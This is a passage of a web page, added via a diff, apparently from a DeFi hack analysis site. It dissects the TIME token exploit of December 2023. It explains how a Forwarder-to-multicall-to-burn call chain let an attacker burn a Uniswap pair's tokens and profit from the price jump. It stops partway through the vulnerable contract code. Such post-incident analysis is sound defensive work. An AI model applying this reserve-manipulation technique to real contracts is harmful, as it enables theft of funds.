@@ -1,0 +1,1269 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://autosaida.github.io/DeFiHackAnalysis/2023/231206_TIME/">
+      
+      
+        <link rel="prev" href="../231018_MicDao/">
+      
+      
+        <link rel="next" href="../../2024/240415_ChaingeFinance/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.41">
+    
+    
+      
+        <title>231206-TIME - DeFiHackAnalysis</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Merriweather+Sans:300,300i,400,400i,700,700i%7CRed+Hat+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Merriweather Sans";--md-code-font:"Red Hat Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="https://unpkg.com/katex@0/dist/katex.min.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#231206-time" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="DeFiHackAnalysis" class="md-header__button md-logo" aria-label="DeFiHackAnalysis" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            DeFiHackAnalysis
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              231206-TIME
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="deep-purple"  aria-label="Dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="deep-orange"  aria-label="Light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Autosaida/DeFiHackAnalysis" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="DeFiHackAnalysis" class="md-nav__button md-logo" aria-label="DeFiHackAnalysis" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    DeFiHackAnalysis
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Autosaida/DeFiHackAnalysis" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2022
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            2022
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2022/221025_ULME/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    221025-ULME
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2022/221129_MBC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    221129-MBC-ZZSH
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2023
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            2023
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../230119_SHOCO/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230119-SHICO
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../230126_TINU/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230126-TINU
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../230415_HundredFinance/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230415-HundredFinance
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../230905_FloorDAO/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230905-FloorDAO
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../230905_HeavensGate_JumpFarm_QuantumWN/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230905-HeavensGate-JumpFarm-QuantumWN
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../231018_MicDao/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    231018-MicDao
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    231206-TIME
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    231206-TIME
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#attacktx" class="md-nav__link">
+    <span class="md-ellipsis">
+      AttackTx
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AttackTx">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fund-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fund Flow
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#invocation-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invocation Flow
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vulnerability
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reproduce" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reproduce
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Flow
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Misc
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Misc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#copycat" class="md-nav__link">
+    <span class="md-ellipsis">
+      Copycat
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#patch" class="md-nav__link">
+    <span class="md-ellipsis">
+      Patch
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2024
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            2024
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2024/240415_ChaingeFinance/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    240415-ChaingeFinance
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#attacktx" class="md-nav__link">
+    <span class="md-ellipsis">
+      AttackTx
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AttackTx">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fund-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fund Flow
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#invocation-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invocation Flow
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vulnerability
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reproduce" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reproduce
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Flow
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Misc
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Misc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#copycat" class="md-nav__link">
+    <span class="md-ellipsis">
+      Copycat
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#patch" class="md-nav__link">
+    <span class="md-ellipsis">
+      Patch
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="231206-time">231206-TIME</h1>
+<h2 id="attacktx">AttackTx</h2>
+<p>Analyzing the <a href="https://phalcon.blocksec.com/explorer/tx/eth/0xecdd111a60debfadc6533de30fb7f55dc5ceed01dfadd30e4a7ebdb416d2f6b6">attack transaction</a> using Phalcon.</p>
+<h3 id="fund-flow">Fund Flow</h3>
+<p><img alt="" src="../../image/231206_TIME.assets/3425.png" /></p>
+<p>The fund flow is straightforward. Initially, the <code>attackContract</code> exchanges 5 Ether for WETH, then exchanges WETH for TIME tokens (4, 5), with a possibility that some TIME tokens were burned during the exchange process (6).</p>
+<p>Subsequently, TIME tokens are exchanged back for WETH, yielding approximately 94.5 WETH, significantly more than the initial 5 WETH input.</p>
+<p>Finally, a bribe is made to the builder, indicating the use of Flashbots' service to prevent frontrunning.</p>
+<p>From the fund flow, it appears that there was a vulnerability in the TIME token that allowed the attacker to burn TIME tokens in the Uniswap pair, artificially increasing the price of the TIME tokens obtained, thus profiting from the attack.</p>
+<h3 id="invocation-flow">Invocation Flow</h3>
+<p>Next, let's analyze the invocation flow.</p>
+<p><img alt="" src="../../image/231206_TIME.assets/4219.png" /></p>
+<p>Similar to the previous analysis, there is an exchange of WETH for TIME tokens.</p>
+<p><img alt="" src="../../image/231206_TIME.assets/4611.png" /></p>
+<p>Subsequently, a <code>execute</code> function of a Forwarder contract is called, with parameters including a signature verified by <code>ecrecover</code>.</p>
+<p>Next, the <code>multicall</code> function of the TIME token is called, followed by a call to the <code>burn</code> function. Strangely, the Uniswap pair's token is burned directly here, rather than the attacker's own tokens.</p>
+<p><img alt="" src="../../image/231206_TIME.assets/5252.png" /></p>
+<p>Finally, a <code>sync</code> is called, reducing the reserves corresponding to the TIME tokens in the pair. This raises the price of TIME tokens, allowing the attacker to sell them for WETH, completing the attack by bribing the builder.</p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>It is evident that the vulnerability exploited by the attacker lies in the call flow <code>Forwarder.execute-&gt;Token.multicall-&gt;Token.burn</code>. Let's analyze it below.</p>
+<p>The main code of <a href="https://etherscan.io/address/0xc82bbe41f2cf04e3a8efa18f7032bdd7f6d98a81#code">Forwarder</a> is as follows:</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kt">struct</span><span class="w"> </span><span class="nv">ForwardRequest</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">from</span><span class="p">;</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">to</span><span class="p">;</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">value</span><span class="p">;</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">gas</span><span class="p">;</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">nonce</span><span class="p">;</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">    </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">data</span><span class="p">;</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="p">}</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="kt">function</span><span class="w"> </span><span class="nv">verify</span><span class="p">(</span>ForwardRequest<span class="w"> </span>calldata<span class="w"> </span>req<span class="p">,</span><span class="w"> </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">calldata</span><span class="w"> </span>signature<span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>view<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
